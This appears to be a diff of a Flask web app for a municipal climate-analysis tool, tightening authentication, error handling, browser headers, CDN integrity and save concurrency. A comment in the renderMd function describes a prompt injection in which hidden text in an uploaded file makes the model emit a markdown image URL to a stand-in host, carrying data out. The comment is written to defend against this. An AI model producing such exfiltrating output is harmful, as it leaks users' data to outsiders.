@@ -8,9 +8,10 @@ import os
 import sys
 import threading
 import time
+from datetime import UTC, datetime
 from functools import wraps
 from pathlib import Path
-from urllib.error import HTTPError
+from urllib.error import HTTPError, URLError
 from urllib.parse import urlencode
 from urllib.request import Request, urlopen
 
@@ -64,13 +65,55 @@ def step_failed(exc: Exception, step: str):
 
 app = Flask(__name__)
 
+# Request bodies are JSON only: files go from the browser straight to Supabase
+# Storage (see ATTACH_BUCKET in the page), because Vercel caps a function's
+# request body at 4.5 MB. The cap sits at that ceiling rather than below it:
+# every save sends the whole analysis, nothing measures how large a real one
+# gets, and a lower cap could start refusing a colleague's save. What it adds is
+# a limit that holds on any host, not only on Vercel, answered as JSON (below)
+# instead of a platform error page. Review S10, 2026-09-30.
+app.config['MAX_CONTENT_LENGTH'] = int(4.5 * 1024 * 1024)
+
+
+@app.errorhandler(413)
+def _too_large(exc):
+    if request.path.startswith('/api/'):
+        return jsonify({'error': 'Det som skickades är för stort för servern. '
+                                 'Hör av dig så tittar vi på det.'}), 413
+    return exc
+
+
+@app.errorhandler(UserFacingError)
+def _user_facing_error(exc: UserFacingError):
+    """A UserFacingError that no route caught (the analyses routes let the
+    database errors from supabase_request through) is answered like step_failed
+    answers one: JSON with its own message and status."""
+    logger.warning("%s %s: %s", request.method, request.path, exc)
+    return jsonify({'error': str(exc)}), exc.status_code
+
+
+@app.errorhandler(500)
+def _internal_error(exc):
+    """JSON for the API, so the browser's error handling can read it. Pages keep
+    Flask's default."""
+    if request.path.startswith('/api/'):
+        return jsonify({'error': 'Något gick fel på servern. Försök igen om en stund.'}), 500
+    return exc
+
 # Supabase is the only login. The legacy shared-password login (/login,
 # AIDA_PASSWORD) was removed 2026-09-27 on Henric's decision: it granted no
 # access in production, but /login still confirmed whether a guess was right.
 # The Flask session is no longer used, so there is no cookie signing key.
+#
+# The legacy HS256 JWT secret is deliberately not read (removed 2026-09-30,
+# review S2). It belongs to the whole Supabase project, which AIda shares with
+# PAC and Zaid, so anyone holding it could mint a token with any user id and
+# any email and walk past the allowlist here. Logins are signed with the
+# project's ES256 key and checked against its public JWKS. A token in any other
+# algorithm is settled by Supabase's own /auth/v1/user, which answers with the
+# email of a real account rather than whatever the token claims.
 SUPABASE_URL = os.environ.get('SUPABASE_URL', '').strip()
 SUPABASE_ANON_KEY = os.environ.get('SUPABASE_ANON_KEY', '').strip()
-SUPABASE_JWT_SECRET = os.environ.get('SUPABASE_JWT_SECRET', '').strip()
 
 try:
     import jwt as pyjwt
@@ -121,10 +164,10 @@ def get_user_claims():
         return None
 
     # Set when local verification failed for a reason Supabase's own endpoint
-    # could still settle (a key we do not have, an algorithm we do not check).
-    # A token whose signature, expiry or audience was checked and found wrong
-    # is not asked about again.
-    key_unknown = alg not in ('ES256', 'HS256')
+    # could still settle (a key we do not have, an algorithm we do not check,
+    # HS256 included). A token whose signature, expiry or audience was checked
+    # and found wrong is not asked about again.
+    key_unknown = alg != 'ES256'
 
     # Try ES256 via JWKS first (Supabase default since 2024)
     jwks = _get_jwks_client()
@@ -146,21 +189,6 @@ def get_user_claims():
                 app.logger.debug("ES256 JWKS validation failed: %s", e)
     elif alg == 'ES256':
         key_unknown = True
-
-    # Fallback: HS256 with local secret
-    if alg == 'HS256':
-        if SUPABASE_JWT_SECRET:
-            try:
-                payload = pyjwt.decode(
-                    token, SUPABASE_JWT_SECRET,
-                    algorithms=['HS256'], audience='authenticated'
-                )
-                if payload.get('sub'):
-                    return payload
-            except Exception as e:
-                app.logger.debug("HS256 validation failed: %s", e)
-        else:
-            key_unknown = True
 
     if not key_unknown:
         return None
@@ -201,6 +229,23 @@ def _parse_allowlist(raw):
 ALLOWED_EMAILS = _parse_allowlist(os.environ.get('AIDA_ALLOWED_EMAILS', ''))
 
 
+def allowlist_missing():
+    """True on Vercel when AIDA_ALLOWED_EMAILS is empty.
+
+    That is the one configuration in which the gate below would admit every
+    confirmed account in the shared Supabase project, and it has happened in
+    production once already: the variable was simply never set. So a deployed
+    AIda without a list refuses everyone (503) instead of serving everyone.
+    Read per call, like the VERCEL check in require_auth, so tests can flip it.
+    """
+    return bool(os.environ.get('VERCEL')) and not ALLOWED_EMAILS
+
+
+if allowlist_missing():
+    logger.error("AIDA_ALLOWED_EMAILS is empty on Vercel: every API request "
+                 "is refused with 503 until it is set")
+
+
 def email_is_allowed(claims):
     """Whether these token claims may use the app.
 
@@ -214,11 +259,12 @@ def email_is_allowed(claims):
     Entries are whole addresses or a domain written as "@karlstad.se", which
     admits exactly that domain: not subdomains, not look-alikes.
 
-    Unset AIDA_ALLOWED_EMAILS keeps the previous behaviour (any
-    authenticated user), so deploying this change alone locks nobody out.
+    An empty AIDA_ALLOWED_EMAILS admits any authenticated user only off
+    Vercel, so local development works without a list. On Vercel it admits
+    nobody (see allowlist_missing).
     """
     if not ALLOWED_EMAILS:
-        return True
+        return not os.environ.get('VERCEL')
     email = (claims.get('email') or '').strip().lower()
     local, _, domain = email.partition('@')
     if not local or not domain or '@' in domain:
@@ -245,6 +291,9 @@ def supabase_request(method, path, data=None, token=None, params=None, prefer=No
         headers['Authorization'] = f'Bearer {token}'
     body = json.dumps(data).encode() if data else None
     req = Request(url, data=body, headers=headers, method=method)
+    # Every failure becomes a UserFacingError, which the error handler below
+    # answers as JSON. A bare exception here used to reach the client as Flask's
+    # HTML error page, and the save indicator read that as a successful save.
     try:
         with urlopen(req, timeout=30) as resp:
             resp_data = resp.read().decode()
@@ -252,26 +301,54 @@ def supabase_request(method, path, data=None, token=None, params=None, prefer=No
     except HTTPError as e:
         error_body = e.read().decode()
         # Log the full Supabase error server-side, but don't leak schema/RLS
-        # details to the client (routes surface str(e) on 500).
+        # details to the client.
         logger.warning("Supabase error %s: %s", e.code, error_body)
-        raise Exception(f"Supabase error {e.code}")
+        if e.code in (401, 403):
+            raise UserFacingError('Inloggningen har gått ut. Ladda om sidan och logga in igen.',
+                                  status_code=401) from e
+        raise UserFacingError(f'Databasen svarade med ett fel ({e.code}). Försök igen om en stund.',
+                              status_code=502) from e
+    except (URLError, TimeoutError, OSError) as e:
+        logger.warning("Supabase unreachable: %s", e)
+        raise UserFacingError('Kunde inte nå databasen. Försök igen om en stund.',
+                              status_code=503) from e
+
+
+def _authenticate():
+    """The login and allowlist gates both decorators share.
+
+    Returns None and sets request.user_id when the caller may proceed,
+    otherwise the response to send. One function because the two decorators
+    used to repeat this block line for line (review D8), and an allowlist
+    change made in one of them would have left the other open.
+    """
+    if allowlist_missing():
+        app.logger.error("AIDA_ALLOWED_EMAILS is empty on Vercel; refused %s", request.path)
+        return jsonify({
+            'error': 'AIda är inte färdigkonfigurerad: listan över vilka konton som får '
+                     'använda den saknas. Hör av dig till den som förvaltar AIda.'
+        }), 503
+    claims = get_user_claims()
+    if not claims:
+        return jsonify({'error': 'Ej inloggad'}), 401
+    if not email_is_allowed(claims):
+        app.logger.warning(
+            "Blocked non-allowlisted user: %s", claims.get('email')
+        )
+        return jsonify({'error': 'Kontot saknar behörighet'}), 403
+    request.user_id = claims['sub']
+    return None
 
 
 def require_auth(f):
+    """Login and allowlist for the endpoints that compute, most of them with
+    LLM tokens. Without Supabase it passes through locally and refuses on
+    Vercel."""
     @wraps(f)
     def decorated(*args, **kwargs):
-        # Supabase JWT auth
         if SUPABASE_URL:
-            claims = get_user_claims()
-            if not claims:
-                return jsonify({'error': 'Ej inloggad'}), 401
-            if not email_is_allowed(claims):
-                app.logger.warning(
-                    "Blocked non-allowlisted user: %s", claims.get('email')
-                )
-                return jsonify({'error': 'Kontot saknar behörighet'}), 403
-            request.user_id = claims['sub']
-            return f(*args, **kwargs)
+            denied = _authenticate()
+            return denied if denied is not None else f(*args, **kwargs)
         # Supabase is not configured. In a serverless (production) deploy that
         # means the LLM-cost endpoints would be public — fail closed. Locally,
         # keep the no-auth convenience.
@@ -281,8 +358,9 @@ def require_auth(f):
     return decorated
 
 
-RATE_LIMIT_PER_MIN = int(os.environ.get('AIDA_RATE_LIMIT_PER_MIN', '15'))
-RATE_LIMIT_PER_DAY = int(os.environ.get('AIDA_RATE_LIMIT_PER_DAY', '150'))
+# An empty value (a copied .env.example line) means the default, not int('').
+RATE_LIMIT_PER_MIN = int(os.environ.get('AIDA_RATE_LIMIT_PER_MIN') or '15')
+RATE_LIMIT_PER_DAY = int(os.environ.get('AIDA_RATE_LIMIT_PER_DAY') or '150')
 
 # {caller_key: [monotonic timestamps]}, trimmed on each check.
 _rate_hits: dict[str, list[float]] = {}
@@ -363,21 +441,14 @@ def rate_limited(f):
 
 
 def require_supabase_auth(f):
-    """Like require_auth but only allows Supabase JWT (for CRUD endpoints)."""
+    """Like require_auth, but the routes behind it read and write rows in
+    Supabase, so there is no pass-through without it, not even locally."""
     @wraps(f)
     def decorated(*args, **kwargs):
         if not SUPABASE_URL:
             return jsonify({'error': 'Supabase ej konfigurerat'}), 501
-        claims = get_user_claims()
-        if not claims:
-            return jsonify({'error': 'Ej inloggad'}), 401
-        if not email_is_allowed(claims):
-            app.logger.warning(
-                "Blocked non-allowlisted user: %s", claims.get('email')
-            )
-            return jsonify({'error': 'Kontot saknar behörighet'}), 403
-        request.user_id = claims['sub']
-        return f(*args, **kwargs)
+        denied = _authenticate()
+        return denied if denied is not None else f(*args, **kwargs)
     return decorated
 
 
@@ -402,9 +473,8 @@ def index():
 # will therefore be ignored." A robots.txt Disallow was blocking exactly the
 # request that would have delivered the noindex signal, so Google could
 # still list the bare URL. robots.txt therefore allows everything; the real
-# work is X-Robots-Tag (on every response, including JSON and the /docs
-# pages, which carry no meta tag of their own) and the meta tag in the page
-# itself.
+# work is X-Robots-Tag (on every response, including JSON, which carries no
+# meta tag of its own) and the meta tag in the page itself.
 ROBOTS_TAG = 'noindex, nofollow'
 
 
@@ -414,26 +484,39 @@ def _no_indexing(response):
     return response
 
 
+# Browser hardening on every response (review S5, 2026-09-30). There is no
+# Content-Security-Policy yet, on purpose: the whole frontend is inline script
+# and style in HTML_TEMPLATE, so a policy strict enough to matter needs nonces
+# or hashes throughout, and a wrong one would break the page for the test
+# group without a single failing test here.
+SECURITY_HEADERS = {
+    # A response is what its Content-Type says; nothing gets sniffed into a script.
+    'X-Content-Type-Options': 'nosniff',
+    # No other site can frame AIda and lay its own buttons over ours.
+    'X-Frame-Options': 'DENY',
+    # Other origins learn at most which site a link came from, never the path.
+    'Referrer-Policy': 'strict-origin-when-cross-origin',
+    # AIda uses none of these, so nothing running in the page may ask for them.
+    'Permissions-Policy': 'camera=(), microphone=(), geolocation=(), payment=(), usb=()',
+}
+
+
+@app.after_request
+def _security_headers(response):
+    for name, value in SECURITY_HEADERS.items():
+        response.headers[name] = value
+    return response
+
+
 @app.route('/robots.txt')
 def robots_txt():
     return Response('User-agent: *\nAllow: /\n', mimetype='text/plain')
 
 
-@app.route('/docs/<path:filename>')
-def serve_docs(filename):
-    """Serve static docs files."""
-    # Resolve relative to this file: src/aida/web/app.py -> project_root/docs/
-    docs_dir = os.path.realpath(os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', '..', '..', 'docs'))
-    filepath = os.path.realpath(os.path.join(docs_dir, filename))
-    # commonpath (not startswith) so "/docs-private" can't pass the prefix check,
-    # and realpath so symlinks can't escape the docs dir.
-    if os.path.commonpath([docs_dir, filepath]) != docs_dir:
-        return 'Forbidden', 403
-    try:
-        with open(filepath) as f:
-            return f.read(), 200, {'Content-Type': 'text/html; charset=utf-8'}
-    except FileNotFoundError:
-        return 'Not found', 404
+# There is no /docs route any more (removed 2026-09-30, review H8). It served
+# docs/*.md without login, and since the deploy never synced docs/, production
+# answered with a months-old copy of ARCHITECTURE.md and CHANGELOG.md, and any
+# file that landed in the deploy repo's docs/ became a public page.
 
 
 @app.route('/api/intake', methods=['POST'])
@@ -552,6 +635,7 @@ def api_aggregate():
 
 @app.route('/api/report', methods=['POST'])
 @require_auth
+@rate_limited
 def api_report():
     from aida.overrides import apply_to_selections_payload
 
@@ -832,7 +916,7 @@ def _external_epds() -> list[dict]:
 
 
 def _search_external_epds(query: str, limit: int) -> list[dict]:
-    """Substring match over name and owner, which is all six rows need.
+    """Substring match over name and owner, which is all eleven rows need.
 
     No ranking and no fuzziness on purpose. The list is tens of rows, entered by
     us, and every term a user would reach for ("Marmoleum", "Forbo", "Swedoor")
@@ -945,7 +1029,7 @@ def api_match():
     """Candidates for "which declaration is the thing that actually got installed".
 
     Searches the whole Environdec index (18 849 rows), not `epd_alternatives.json`
-    (1 428). That file is pruned to the best candidates per category, which is
+    (2 613). That file is pruned to the best candidates per category, which is
     right when proposing what to build and wrong here: the product a contractor
     actually delivered is usually not one of the best in its category, and a
     search that cannot find it would push the user towards a typvärde for no
@@ -1348,12 +1432,29 @@ def update_analysis(analysis_id):
     for key in ('property_ref', 'planned_start'):
         if key in data:
             update[key] = _nullable_text(data[key])
+    # Set here as well as by the table's trigger, so the version check below
+    # works on a database where the trigger was never created.
+    update['updated_at'] = datetime.now(UTC).isoformat()
     params = {
         'id': f'eq.{analysis_id}',
         'user_id': f'eq.{request.user_id}',
     }
+    # Optimistic concurrency. Every save writes the whole analysis, so a window
+    # that has fallen behind (a second tab, the phone next to the desktop) would
+    # otherwise put back everything done elsewhere since it last loaded. The
+    # client sends the updated_at it last saw; if the row has moved on, nothing
+    # matches, nothing is written, and the client reloads.
+    expected = data.get('expected_updated_at')
+    if expected:
+        params['updated_at'] = f'eq.{expected}'
     result = supabase_request('PATCH', 'analyses', data=update, token=token, params=params)
     if not result:
+        if expected:
+            still_there = supabase_request('GET', 'analyses', token=token, params={
+                'select': 'id', 'id': f'eq.{analysis_id}', 'user_id': f'eq.{request.user_id}'})
+            if still_there:
+                return jsonify({'error': 'Analysen har ändrats i ett annat fönster.',
+                                'conflict': True}), 409
         return jsonify({'error': 'Ej hittad'}), 404
     return jsonify(result[0] if isinstance(result, list) else result)
 
@@ -1390,9 +1491,13 @@ HTML_TEMPLATE = r"""<!DOCTYPE html>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
-<script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/dompurify@3/dist/purify.min.js"></script>
-{% if has_supabase %}<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>{% endif %}
+<!-- Exact versions with Subresource Integrity: a file that changes on the CDN is
+     refused instead of run next to the login session. These are the files the
+     unpinned URLs served on 2026-09-30. To upgrade, change the version and hash
+     the exact file: curl -s URL | openssl dgst -sha384 -binary | openssl base64 -A -->
+<script src="https://cdn.jsdelivr.net/npm/marked@15.0.12/marked.min.js" integrity="sha384-948ahk4ZmxYVYOc+rxN1H2gM1EJ2Duhp7uHtZ4WSLkV4Vtx5MUqnV+l7u9B+jFv+" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/dompurify@3.4.16/dist/purify.min.js" integrity="sha384-a7SzOxErzJ3ZpQz0zJ32d67dSitNzPcbfybc/ykU9KJhMgZkwqfSxlhhdJRS+XGL" crossorigin="anonymous"></script>
+{% if has_supabase %}<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.117.2/dist/umd/supabase.min.js" integrity="sha384-WgXwGL6fUsYJWNaKJgVbrJKGRQwc1vieh2oy4kw9nXqpNDz3tdSsqEYUgeHD/NuF" crossorigin="anonymous"></script>{% endif %}
 <style>
 /* === Karlstads kommun färgpalett (karlstad.se-manér) === */
 :root {
@@ -2581,8 +2686,22 @@ function renderMd(text) {
   // innerHTML through DOMPurify. If the sanitizer did not load (CDN blocked)
   // the text is escaped instead of rendered, so model-written markup can
   // never run unsanitized. Until 2026-09-26 raw marked output went through.
+  //
+  // Nothing in it may load by itself either (review S6, 2026-09-30). Hidden
+  // text in an uploaded quote can ask the model to answer with
+  // ![](https://x.example/?d=<the component list>); DOMPurify's defaults keep
+  // <img src=https://...>, and the browser fetches it, carrying the data out.
+  // Nothing AIda renders through here is an image, SVG or MathML, so those are
+  // refused along with every other tag and attribute DOMPurify would keep that
+  // fetches a URL without a click (checked against DOMPurify 3.4.16 with a
+  // list of such vectors). Tables keep their alignment: marked writes it as
+  // align="", not as style.
   if (typeof marked !== 'undefined' && typeof DOMPurify !== 'undefined') {
-    return DOMPurify.sanitize(marked.parse(text));
+    return DOMPurify.sanitize(marked.parse(text), {
+      USE_PROFILES: { html: true },
+      FORBID_TAGS: ['img', 'picture', 'source', 'video', 'audio', 'track', 'input', 'style'],
+      FORBID_ATTR: ['style', 'srcset', 'poster', 'background'],
+    });
   }
   return text.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
     .replace(/"/g,'&quot;').replace(/'/g,'&#39;')
@@ -2908,11 +3027,15 @@ async function refreshFollowup() {
   try {
     do {
       _followupAgain = false;
+      const epoch = analysisEpoch;
       const r = await authFetch('/api/followup', {method: 'POST', headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({project: state.project, baseline: state.baseline,
                               selections: state.selections, as_built: state.as_built,
                               overrides: state.overrides})});
       const d = await r.json();
+      // The table belongs to the analysis it was asked for. The one now on
+      // screen asks again itself (restoreUI), which sets _followupAgain.
+      if (epoch !== analysisEpoch) continue;
       if (d && !d.error) {
         state.followup = d;
         if (isFollowup()) renderSheet();
@@ -3338,6 +3461,9 @@ else setupAttachmentInputs();
 async function sendMessage() {
   const input = document.getElementById('userInput');
   if (!input.value.trim() && !_pendingAttachmentIds.length && !_uploadsInFlight.length) return;
+  // Read before the first await. Every step below must run against the
+  // analysis the message was typed in, or not at all (save review F2-F4).
+  const epoch = analysisEpoch;
   // Same gesture window as confirmStep: a chat message can kick off a rerun
   // that takes just as long as a first run. Before any await, or the browser
   // no longer counts it as the click that asked.
@@ -3346,6 +3472,9 @@ async function sendMessage() {
   if (_uploadsInFlight.length) {
     setLoading(true);
     await Promise.allSettled(_uploadsInFlight);
+    // Switched while the files uploaded: the text stays in the box, and the
+    // indicator belongs to the analysis now on screen.
+    if (epoch !== analysisEpoch) return;
     setLoading(false);
   }
   let text = input.value.trim();
@@ -3375,10 +3504,10 @@ async function sendMessage() {
   // router only fires on messages neither regex catches — exactly the pure
   // questions we want it for. Any routing error falls through (fail-safe).
   if (!wantsAdvance && !wantsCorrection) {
-    const epoch = analysisEpoch;
     try {
       const routed = await routeMessage(text);
-      if (lateReply(epoch)) { setLoading(false); return; }
+      // No setLoading: the indicator belongs to the analysis now on screen.
+      if (lateReply(epoch)) return;
       if (routed && routed.intent === 'advisory_question') {
         userEntry.role = 'user';
         // In Chatt the answer itself went on the sheet, and the reply says where.
@@ -3391,6 +3520,9 @@ async function sendMessage() {
       // Router unavailable — proceed with the existing flow rather than block.
     }
   }
+  // A router that failed after a switch lands here too, and the step of the
+  // analysis now on screen would take this message.
+  if (lateReply(epoch)) return;
 
   switch (state.step) {
     case 'idle':
@@ -3417,7 +3549,7 @@ async function sendMessage() {
         // Re-run intake with correction, then auto-trigger baseline
         addMsg('Uppdaterar projektet och r\u00e4knar om baslinjen...', 'system');
         await runIntake(buildCorrectionContext(text));
-        if (state.step === 'intake_done') {
+        if (epoch === analysisEpoch && state.step === 'intake_done') {
           await runBaseline();
         }
       } else {
@@ -3448,9 +3580,9 @@ async function sendMessage() {
         // Re-run from intake with correction
         addMsg('G\u00f6r om analysen med dina kommentarer...', 'system');
         await runIntake(buildCorrectionContext(text));
-        if (state.step === 'intake_done') {
+        if (epoch === analysisEpoch && state.step === 'intake_done') {
           await runBaseline();
-          if (state.step === 'baseline_done') {
+          if (epoch === analysisEpoch && state.step === 'baseline_done') {
             await runAlternatives();
           }
         }
@@ -3491,9 +3623,11 @@ function confirmStep() {
 async function runIntake(desc) {
   addMsg('Analyserar projektbeskrivning...', 'system');
   setProgressStep('planering');
+  const epoch = analysisEpoch;
   try {
     const r = await authFetch('/api/intake', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({description: desc, attachments: attachmentRefs()})});
     const d = await r.json();
+    if (lateReply(epoch)) return;
     if (d.error) { addMsg('Fel: ' + d.error, 'system'); setLoading(false); return; }
 
     if (d.clarification_needed) {
@@ -3545,7 +3679,10 @@ async function runIntake(desc) {
     const summary = intakeSummary(d);
     addConfirmMsg(summary.text, summary.btnLabel, summary.hint);
     setLoading(false);
-  } catch(e) { addMsg('Fel: ' + e.message, 'system'); setLoading(false); }
+  } catch(e) {
+    if (lateReply(epoch)) return;
+    addMsg('Fel: ' + e.message, 'system'); setLoading(false);
+  }
 }
 
 // === Pipeline: Baseline ===
@@ -3562,9 +3699,11 @@ async function runBaseline() {
   setProgressStep('baslinje');
   setLoading(true);
   clearActionRows();
+  const epoch = analysisEpoch;
   try {
     const r = await authFetch('/api/baseline', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({project: state.project})});
     const d = await r.json();
+    if (lateReply(epoch)) return;
     if (d.error) {
       addMsg('Fel: ' + d.error, 'system');
       addConfirmMsg('Baslinjeberäkning misslyckades.', 'Försök igen \u2192', '');
@@ -3592,6 +3731,7 @@ async function runBaseline() {
                   'Skriv i chatten om du vill korrigera n\u00e5got.');
     setLoading(false);
   } catch(e) {
+    if (lateReply(epoch)) return;
     addMsg('Fel: ' + e.message, 'system');
     addConfirmMsg('Baslinjeberäkning misslyckades.', 'Försök igen \u2192', '');
     notifyStepDone('baseline', false);
@@ -3770,8 +3910,10 @@ function bindIntent(comp, altName, pickIntent, need) {
   const want = normAltName(altName);
   const alt = (comp.alternatives || []).find(a => normAltName(a.name) === want);
   if (!alt) return null;
+  // Same shape as selectAlt, per-article price included.
   return {id: comp.component_id, name: comp.component_name,
-    selected_alternative: {name: alt.name, co2e_kg: alt.co2e_kg, cost_sek: alt.cost_sek,
+    selected_alternative: {name: alt.name, co2e_kg: alt.co2e_kg,
+      cost_sek: articlePrice(alt) > 0 ? 0 : alt.cost_sek, article_price_sek: articlePrice(alt),
       source: alt.source,
       available_quantity: (alt.available_quantity === undefined ? null : alt.available_quantity),
       price_basis: alt.price_basis || '', gwp_basis: alt.gwp_basis || ''},
@@ -3859,6 +4001,7 @@ async function runAlternatives(userFeedback) {
   const subStepTimer = setTimeout(() => {
     setProgressStep('nyproduktion');
   }, 2000);
+  const epoch = analysisEpoch;
   try {
     const body = {project: state.project, baseline: state.baseline};
     // Full rerun: replay all standing directives (global + every component's).
@@ -3867,6 +4010,7 @@ async function runAlternatives(userFeedback) {
     const r = await authFetch('/api/alternatives', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(body)});
     const d = await r.json();
     clearTimeout(subStepTimer);
+    if (lateReply(epoch)) return;
     if (d.error) {
       clearTimeout(subStepTimer);
       addMsg('Fel: ' + d.error, 'system');
@@ -3902,6 +4046,7 @@ async function runAlternatives(userFeedback) {
     setLoading(false);
   } catch(e) {
     clearTimeout(subStepTimer);
+    if (lateReply(epoch)) return;
     addMsg('Fel: ' + e.message, 'system');
     addConfirmMsg('S\u00f6kning av alternativ misslyckades.', 'F\u00f6rs\u00f6k igen \u2192', '');
     notifyStepDone('alternatives', false);
@@ -3918,6 +4063,7 @@ async function generateReport() {
   // that leaves the UI stuck (the error paths below already guard the same way).
   const rb0 = document.getElementById('reportBtn'); if (rb0) rb0.disabled = true;
   setLoading(true);
+  const epoch = analysisEpoch;
   try {
     const sels = {components: Object.values(state.selections)};
     // The raw selections plus the overrides, not the overridden ones: the
@@ -3926,6 +4072,7 @@ async function generateReport() {
     // disagree about which numbers were replaced.
     const r = await authFetch('/api/report', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({project: state.project, selections: sels, overrides: state.overrides})});
     const d = await r.json();
+    if (lateReply(epoch)) return;
     if (d.error) {
       addMsg('Fel: ' + d.error, 'system');
       addConfirmMsg('Rapportgenerering misslyckades.', 'Försök igen →', '');
@@ -3943,6 +4090,7 @@ async function generateReport() {
     switchTab('rapport');
     setLoading(false);
   } catch(e) {
+    if (lateReply(epoch)) return;
     addMsg('Fel: ' + e.message, 'system');
     addConfirmMsg('Rapportgenerering misslyckades.', 'Försök igen →', '');
     notifyStepDone('report', false);
@@ -3958,6 +4106,7 @@ async function generateReport() {
 async function generateFollowupReport() {
   addMsg('Skriver klimatredovisningen...', 'system');
   setLoading(true);
+  const epoch = analysisEpoch;
   try {
     const r = await authFetch('/api/followup/report', {
       method: 'POST', headers: {'Content-Type': 'application/json'},
@@ -3965,6 +4114,7 @@ async function generateFollowupReport() {
                             selections: state.selections, as_built: state.as_built,
                             overrides: state.overrides, property_ref: state.propertyRef || ''})});
     const d = await r.json();
+    if (lateReply(epoch)) return;
     if (d.error) { addMsg('Fel: ' + d.error, 'system'); setLoading(false); return; }
     state.reportMarkdown = d.markdown;
     scheduleAutoSave();
@@ -3977,6 +4127,7 @@ async function generateFollowupReport() {
     recordFollowupFacts();
     setLoading(false);
   } catch(e) {
+    if (lateReply(epoch)) return;
     addMsg('Fel: ' + e.message, 'system');
     setLoading(false);
   }
@@ -4003,11 +4154,24 @@ async function recordFollowupFacts() {
   }
 }
 
+// A notice in the chat that is shown but not stored. For things that concern
+// this browser window rather than the analysis on screen: storing them would
+// write the analysis just to carry the sentence.
+function showNotice(text) {
+  const d = document.createElement('div');
+  d.className = 'msg system';
+  d.textContent = text;
+  document.getElementById('messages').appendChild(d);
+  d.scrollIntoView({behavior: 'smooth'});
+}
+
 // True, after telling the user, when a reply arrives for an analysis the view
-// has since left. See analysisEpoch.
+// has since left. See analysisEpoch. The caller returns without touching the
+// state or the loading indicator: both belong to the analysis now on screen,
+// and the switch already reset the indicator.
 function lateReply(epoch) {
   if (epoch === analysisEpoch) return false;
-  addMsg('Svaret kom efter att du bytt analys, så det lades inte in här.', 'system');
+  showNotice('Ett svar till projektet du lämnade kom efter att du bytt projekt och lades inte in, varken här eller där. Öppna det projektet och kör steget igen om du behöver resultatet.');
   return true;
 }
 
@@ -4043,6 +4207,7 @@ async function runChat(text, userEntry) {
   // than push a second one: a duplicate would render twice after a reload.
   if (userEntry) userEntry.role = 'user';
   else console.warn('runChat utan conversation-entry: turen sparas inte i modellens kontext');
+  const epoch = analysisEpoch;
   try {
     const body = {
       message: text,
@@ -4058,11 +4223,10 @@ async function runChat(text, userEntry) {
       attachments: attachmentRefs(),
       sheet: isDoc() ? (state.sheet || emptySheet()) : null,
     };
-    const epoch = analysisEpoch;
     const r = await authFetch('/api/chat', {method:'POST', headers:{'Content-Type':'application/json'},
       body: JSON.stringify(body)});
     const d = await r.json();
-    if (lateReply(epoch)) { setLoading(false); return; }
+    if (lateReply(epoch)) return;
     if (d.error) { addMsg('Fel: ' + d.error, 'system'); setLoading(false); return; }
 
     applyAgentStateUpdates(d.state_updates);
@@ -4077,8 +4241,11 @@ async function runChat(text, userEntry) {
     if (Array.isArray(pendingActions) && pendingActions.length > 0) {
       await processPendingActions(pendingActions);
     }
-    setLoading(false);
-  } catch(e) { addMsg('Fel: ' + e.message, 'system'); setLoading(false); }
+    if (epoch === analysisEpoch) setLoading(false);
+  } catch(e) {
+    if (lateReply(epoch)) return;
+    addMsg('Fel: ' + e.message, 'system'); setLoading(false);
+  }
 }
 
 // Execute reruns requested by the chat agent. Full reruns (empty component_ids)
@@ -4110,7 +4277,12 @@ async function processPendingActions(actions) {
     return 0;
   });
 
+  // The actions were asked for on this analysis. After a switch, state.project
+  // is another one whose component ids may well repeat ("c1"), so the rest of
+  // the list must not run against it.
+  const epoch = analysisEpoch;
   for (const action of ordered) {
+    if (epoch !== analysisEpoch) return;
     try {
       let cids = Array.isArray(action.component_ids) ? action.component_ids.filter(c => knownIds.has(c)) : [];
       // Empty after filter (unknown ids) and not originally full means we have
@@ -4168,6 +4340,7 @@ async function runBaselineForComponents(componentIds, reason, orchestrated) {
   const reasonNote = reason ? ' (' + reason + ')' : '';
   addMsg('Aida räknar om ' + scope + reasonNote + '...', 'system');
   if (!orchestrated) setLoading(true);
+  const epoch = analysisEpoch;
   try {
     const body = {project: state.project};
     if (!isFull) body.component_ids = componentIds;
@@ -4177,6 +4350,7 @@ async function runBaselineForComponents(componentIds, reason, orchestrated) {
       body: JSON.stringify(body),
     });
     const d = await r.json();
+    if (lateReply(epoch)) return;
     if (d.error) {
       addMsg('Fel vid baslinjebberäkning: ' + d.error, 'system');
       notifyStepDone('baseline_rerun', false);
@@ -4203,10 +4377,11 @@ async function runBaselineForComponents(componentIds, reason, orchestrated) {
     addMsg('Baslinje uppdaterad' + (isFull ? '' : ' för ' + componentIds.join(', ')) + '.', 'system');
     notifyStepDone('baseline_rerun', true, isFull ? null : componentIds.join(', '));
   } catch (e) {
+    if (lateReply(epoch)) return;
     addMsg('Fel vid baslinjebberäkning: ' + e.message, 'system');
     notifyStepDone('baseline_rerun', false);
   } finally {
-    if (!orchestrated) setLoading(false);
+    if (!orchestrated && epoch === analysisEpoch) setLoading(false);
   }
 }
 
@@ -4223,6 +4398,7 @@ async function runAlternativesForComponents(componentIds, userFeedback, reason, 
   const feedbackNote = userFeedback ? ' Önskemål (sparas som stående): ' + userFeedback + '.' : '';
   addMsg('Aida kör om ' + scope + reasonNote + feedbackNote + '...', 'system');
   if (!orchestrated) setLoading(true);
+  const epoch = analysisEpoch;
   try {
     const body = {project: state.project, baseline: state.baseline};
     if (!isFull) body.component_ids = componentIds;
@@ -4237,6 +4413,7 @@ async function runAlternativesForComponents(componentIds, userFeedback, reason, 
       body: JSON.stringify(body),
     });
     const d = await r.json();
+    if (lateReply(epoch)) return;
     if (d.error) {
       addMsg('Fel vid alternativsökning: ' + d.error, 'system');
       notifyStepDone('alternatives_rerun', false);
